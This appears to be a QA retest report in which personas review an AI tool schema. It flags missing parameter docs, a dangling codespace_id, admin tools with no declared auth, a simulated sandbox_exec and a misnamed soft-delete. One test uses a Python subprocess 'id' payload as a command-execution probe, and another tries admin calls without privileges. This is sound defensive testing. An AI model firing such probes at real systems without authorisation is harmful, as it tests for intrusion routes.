  The schema says `"description":""` — a blank string — for the `files` parameter on **both** `storage_manifest_diff` and `storage_upload_batch`. There is no documentation of expected format (array of `{path, sha256, content}`? base64? JSON string? multipart?).

- **Result**: **CONFIRMED**
- **Detail**: Both tools list `files` as the sole required property with `"type":"string"` and `"description":""`. The outer tool description mentions "SHA-256 hashes" and "R2 put" but gives no schema example. A content creator implementing auto-save has zero guidance on payload format. This is a schema documentation lie of omission — the tool is presented as usable but cannot be correctly invoked without out-of-band knowledge.

---

### Issue 3: `bootstrap_create_app` Requires `codespace_id` But No Tool Exposes Codespace Discovery

- **Targeted Test**: Rachel wants to publish a live Monaco app. The correct flow is: classify idea → create app → link to codespace. I'd call:
  ```json
  {
    "app_name": "my-editor",
    "description": "Live React playground",
    "code": "export default () => <div>hello</div>",
    "codespace_id": "???"
  }
  ```
  `codespace_id` is a required field. Scanning the full 160+ tool list: there is **no** `codespace_create`, `codespace_list`, `codespace_get`, or any tool that returns a codespace ID. `create_check_health` also requires a `codespace_id` with the same gap.

- **Result**: **CONFIRMED**
- **Detail**: The dependency is a dangling reference in the schema. `bootstrap_create_app` description says it *"Delegates codespace creation and app linking to the spike.land API"* — implying codespace creation is a side effect, not a prerequisite — yet the field is `required`. If the API auto-creates the codespace when `codespace_id` is omitted or empty-string, the schema should either mark it optional or document the auto-create behavior. Currently it is a **blocking schema lie** for Rachel's primary use case.

---

## Summary of Local Delta

| Area | Prod (assumed) | Local Schema | Delta |
|---|---|---|---|
| `sandbox_exec` simulation warning | May have been undocumented | Explicitly documented in description | **No improvement** — still simulated, now self-disclosed |
| `storage_*` `files` param docs | Empty | Still empty | **No fix applied** |
| Codespace lifecycle tools | Missing | Still missing | **No fix applied** |
| `esbuild_transpile` / `esbuild_validate` | Present | Present and well-described | These appear **healthy** — real transpilation path exists for Rachel if she wires it manually |
| `create_check_health` codespace gap | Present | Still present | **CONFIRMED carried forward** |

All three issues appear to be **structural gaps** in the local schema, not regressions from prod. No evidence of targeted fixes addressing the content-creator / live-preview workflow between versions.

---

# Persona: Oleg Petrov (Targeted Retest)
## Targeted Findings

---

### Issue 1: Admin Tools Lack Visible Auth Enforcement in Schema

- **Targeted Test**: Call `skill_store_admin_list` with `status: "draft"`, `limit: "20"`, `offset: "0"` as an unauthenticated or low-privilege user. Also call `bazdmeg_superpowers_gate_override` with an arbitrary `sessionId` and `gateName`. Expectation: schema should declare a required `role`, `admin_token`, or similar auth discriminator — or at minimum document that server-side RBAC enforces access. The schema shows neither.
- **Result**: CONFIRMED
- **Detail**: All four `skill_store_admin_*` tools (`skill_store_admin_list`, `skill_store_admin_create`, `skill_store_admin_update`, `skill_store_admin_delete`) and `bazdmeg_superpowers_gate_override` have input schemas with zero auth/role parameters. There is no `required` field for a session token, API key, or role claim. The only signal that these are restricted is the word "admin" in the tool name and description string. A schema-level attacker or confused caller has no contract telling them the call will be rejected — they must discover the 403 at runtime. For an admin power user, this is a trust gap: the schema implies "call me with these params" but gives no indication of what credential path gates the operation.

---

### Issue 2: `sandbox_exec` Is a Simulation, Not Execution — Schema Lie by Name

- **Targeted Test**: As a power user, I would call `sandbox_exec` with `sandbox_id` from a prior `sandbox_create`, pass a real shell payload such as `code: "import subprocess; print(subprocess.check_output(['id']).decode())"` with `language: "python"`, and expect actual stdout. The description explicitly states: *"SIMULATED EXECUTION ONLY — no code actually runs. Returns synthetic stdout/stderr for prototyping tool invocation patterns."*
- **Result**: CONFIRMED
- **Detail**: The tool is named `sandbox_exec` — "exec" implies execution. The surrounding tools (`sandbox_create`, `sandbox_read_file`, `sandbox_write_file`, `sandbox_destroy`) form a lifecycle that implies a real ephemeral environment. However `sandbox_exec` degrades the entire sandbox category to a mock. A power user building an automation pipeline that calls `sandbox_create → sandbox_write_file → sandbox_exec → sandbox_read_file` will receive fabricated output with no indication at the call site that results are synthetic. The description buries the disclaimer in prose rather than surfacing it as a schema-level `deprecated: true` or a `simulation: boolean` return field. This is a critical schema credibility failure for any operational use case.

---

### Issue 3: Destructive `skill_store_admin_delete` Is a Soft-Delete with Misleading Name

- **Targeted Test**: Call `skill_store_admin_delete` with a known `skill_id`. As an admin expecting a hard delete (permanent record removal for GDPR, data hygiene, or rollback of a bad publish), I would pass `skill_id: "some-uuid"`. Expected behavior from the name: record gone. Actual schema description: *"Archive a skill (soft-delete). Sets status to ARCHIVED."*
- **Result**: CONFIRMED
- **Detail**: The tool is named `*_delete` but performs an archive operation. There is no `permanent: boolean` parameter, no `hard_delete` variant, and no schema documentation of the difference. For an admin conducting bulk cleanup or a destructive action (e.g., removing a malicious or copyrighted skill), this means the data is not actually removed from the database — it is merely hidden from public listing. The `skill_store_admin_list` tool accepts a `status` filter, meaning `status: "archived"` would still surface the "deleted" record. This is a naming/semantic contract violation: the operation advertised as `delete` does not satisfy data deletion requirements and gives the admin false confidence that the record is gone.

---

## Summary of Local Delta

| Area | Observation |
|---|---|
| Admin auth surface | No changes from previous report — admin tools remain schema-ungated |
| `sandbox_exec` | Simulation disclaimer is present in description text but no schema-level flag; unchanged |
| `skill_store_admin_delete` | Soft-delete behavior documented in description but tool name still says `delete`; unchanged |
| New tools present | `bazdmeg_superpowers_gate_override` added — follows same zero-auth-param pattern as other admin tools |
| `storage_list` | All three pagination params (`prefix`, `limit`, `cursor`) remain `required` in schema despite being logically optional |
| `billing_cancel_subscription` | `confirm` parameter typed as `string` (not `boolean`) — `"true"`/`"false"` strings required instead of proper boolean |

No schema fixes observed for any of the three confirmed issues. All issues persist in the local schema exactly as they appeared in the production report.